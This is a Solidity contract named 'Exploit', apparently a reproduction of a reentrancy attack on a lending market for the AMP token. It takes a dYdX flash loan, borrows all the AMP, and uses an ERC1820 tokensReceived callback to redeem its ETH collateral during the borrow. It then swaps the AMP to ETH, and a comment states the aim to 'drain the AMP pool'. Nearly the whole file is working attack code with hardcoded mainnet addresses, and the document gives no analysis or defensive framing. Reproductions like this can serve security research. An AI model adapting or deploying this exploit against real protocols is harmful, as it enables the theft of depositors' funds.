//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

interface ICToken{
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface WETH{
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IComptroller{
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function exitMarket(address fToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface IUniswap{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ICEther{
    function mint() external payable;
    function borrow(uint256) external returns (uint);
    function redeemUnderlying(uint redeemAmount) external returns (uint);
}

interface IAMP{
    function registerCollateralManager() external;
}

interface IERC1820{
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external ;
}

interface IRouter{
    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

// data structures for dYdX flash loan
library Types {
    enum AssetDenomination { Wei, Par }
    enum AssetReference { Delta, Target }
    struct AssetAmount {
        bool sign;
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }
}

library Account {
    struct Info {
        address owner;
        uint256 number;
    }
}

library Actions {
    enum ActionType {
        Deposit,   // supply tokens
        Withdraw,  // borrow tokens
        Transfer,  // transfer balance between accounts
        Buy,       // buy an amount of some token (externally)
        Sell,      // sell an amount of some token (externally)
        Trade,     // trade tokens against another account
        Liquidate, // liquidate an undercollateralized or expiring account
        Vaporize,  // use excess tokens to zero-out a completely negative account
        Call       // send arbitrary data to an address
    }
    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }
}
interface ISoloMargin {
    function operate(Account.Info[] memory accounts, Actions.ActionArgs[] memory actions) external;
}

contract Exploit {

    address comptroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address cramp = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address creth = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address cdai = 0x92B767185fB3B04F881e3aC8e5B0662a027A1D9f;

    address amp = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address uniswapPool = 0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E;
    address v2router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address ampwethpool = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;

    address erc1820registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;

    string internal constant AMP_TOKENS_RECIPIENT = "AmpTokensRecipient";

    address soloMargin = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;

    uint256 constant flashLoanAmount = 20_000 ether; // 20k is enough to drain the AMP pool

    function start() external {
        console.log("Good to go.");

        bytes32 interfaceHash = keccak256(abi.encodePacked(AMP_TOKENS_RECIPIENT));
        IERC1820(erc1820registry).setInterfaceImplementer(address(this), interfaceHash, address(this));

        dydxFlashLoan(flashLoanAmount);
    }

    function dydxFlashLoan(uint256 borrowAmount) internal {
        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);

        operations[0] = Actions.ActionArgs({
            actionType: Actions.ActionType.Withdraw,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: false,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: borrowAmount // Amount to borrow
            }),
            primaryMarketId: 0, // WETH
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ''
        });

        operations[1] = Actions.ActionArgs({
            actionType: Actions.ActionType.Call,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: false,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: 0
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ""
        });

        operations[2] = Actions.ActionArgs({
            actionType: Actions.ActionType.Deposit,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: true,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: borrowAmount + 2 // Repayment amount with 2 wei fee
            }),
            primaryMarketId: 0, // WETH
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ''
        });

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = Account.Info({owner: address(this), number: 1});

        ISoloMargin(soloMargin).operate(accountInfos, operations);
    }

    // Dydx flash loan callback function
    function callFunction(
        address sender,
        Account.Info memory,
        bytes memory data
    ) external {
        require(sender == address(this), 'Not from this contract');

        // deposit ETH into cream
        WETH(weth).withdraw(flashLoanAmount);
        ICEther(creth).mint{value: flashLoanAmount}();
        address[] memory compMarkets = new address[](2);
        compMarkets[0] = creth;
        compMarkets[1] = cramp;
        IComptroller(comptroller).enterMarkets(compMarkets);

        // borrow AMP from cream
        uint256 ampAmount = IERC20(amp).balanceOf(cramp);
        uint err = ICToken(cramp).borrow(ampAmount);
        require(err == 0, "fail to borrow amp from comp");

        // Sell ALL AMP to ETH
        IERC20(amp).approve(v2router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = amp;
        path[1] = weth;
        IRouter(v2router).swapExactTokensForETH(ampAmount, 0, path, address(this), block.timestamp);

        // console.log("ETH Amount: ", address(this).balance / 1e18, IERC20(weth).balanceOf(address(this)) / 1e18);

        // convert ETH to WETH
        WETH(weth).deposit{value: address(this).balance}();

        // repay loans on dYdX
        IERC20(weth).approve(soloMargin, flashLoanAmount+2);
    }

    function tokensReceived(
        bytes4 functionSig,
        bytes32 partition,
        address operator,
        address from,
        address to,
        uint256 value,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        console.log("We are in the callback now");

        IComptroller(comptroller).exitMarket(creth);
        ICEther(creth).redeemUnderlying(flashLoanAmount);
    }
    fallback() external payable {}
    receive() external payable {}
}
